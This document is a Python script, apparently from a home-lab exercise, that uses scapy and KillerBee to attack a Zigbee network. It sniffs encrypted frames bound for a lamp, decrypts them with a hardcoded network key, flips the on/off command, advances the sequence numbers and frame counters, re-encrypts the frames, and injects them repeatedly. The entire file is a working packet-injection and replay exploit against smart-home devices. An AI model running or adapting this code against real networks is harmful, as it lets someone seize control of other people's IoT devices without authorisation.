from scapy import *
from killerbee.scapy_extensions import *
import argparse


parser = argparse.ArgumentParser(description="Zigbee packet injector")
parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=14) # Option to provide zigbee channel

args = parser.parse_args()

# Key gotten from network exploration
key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")

#pkts = kbrdpcap("/home/kali/Downloads/test.pcap")

def craftPacket(pkt, data):
    # Update sequence numbers
    pkt[0].getlayer("Dot15d4").seqnum += 1
    pkt[0].getlayer("ZigbeeNWK").seqnum += 1
    data.getlayer("ZigbeeAppDataPayload").counter += 1
    data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1

    # XOR command with 0x01 since the command for off = 0x00 and on = 0x01 so it will always flip
    data.getlayer("ZigbeeClusterLibrary").command_identifier ^= 0x01

    # Reencrypt data in to the packet
    pkt = kbencrypt(pkt[0], data, key)
    print("\n\n********PACKET SHOW*******\n\n")
    pkt.show()
    print("\n\n********DECRYPT SHOW BEFORE FC*******\n\n")
    # Increase another sequence
    pkt.getlayer("ZigbeeSecurityHeader").fc += 1 
    return pkt

# Get device
dev = KillerBee(device=kbutils.devlist()[0][0])

try:
    while True:
      # Sleep to slow down loop
        time.sleep(0.1)

        # Sniff and display a packet with destination of our lamp
        pkt = kbsniff(iface=dev, count=1, channel=args.channel, lfilter=lambda x: x.haslayer("Dot15d4Data") and x.getlayer("Dot15d4Data").dest_addr==0xaa51)
        pkt[0].show()

        # If it has a ZigbeeSecurityHeader, decrypt and check if it is an on/off packet
        if pkt[0].haslayer("ZigbeeSecurityHeader"):
            pkt[0].getlayer("ZigbeeSecurityHeader").data = pkt[0].getlayer("ZigbeeSecurityHeader").data[0:-2]
            dec = kbdecrypt(pkt[0], key)
            if (dec.haslayer("ZigbeeClusterLibrary")) and (dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0 or dec.getlayer("ZigbeeClusterLibrary").command_identifier == 1): 
                # Update sequence numbers and change command and print newly crafted packet
                pkt = craftPacket(pkt, dec)
                print("\n\n********NEW PACKET********")
                pkt.show()
                # Send new packet 5 times with a short delay
                for i in range (0,5):
                    kbsendp(pkt, args.channel, iface=dev)
                    time.sleep(1)
except KeyboardInterrupt:
  # When closing the loop close connection to usb 
  dev.close()

    